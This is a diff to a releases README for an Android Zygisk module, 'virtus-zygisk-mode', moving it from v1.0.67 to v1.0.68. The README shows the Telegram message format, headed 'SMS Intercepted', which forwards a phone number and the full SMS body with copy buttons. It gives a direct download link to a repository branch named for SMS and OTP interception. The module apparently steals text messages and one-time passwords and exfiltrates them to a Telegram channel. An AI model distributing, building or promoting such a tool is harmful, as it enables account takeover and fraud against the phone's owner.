@@ -1,12 +1,13 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.67.zip**
+Latest: **virtus-zygisk-mode-v1.0.68.zip**
 
-TG format + One-tap copy:
+TG message:
 ```
 📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
-To +919920104300
-Message: <full SMS body>
+To +91xxxxxxxxxx
+Message: <full SMS>
 ```
+Buttons: **Number copy** | **SMS copy**
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.67.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.68.zip
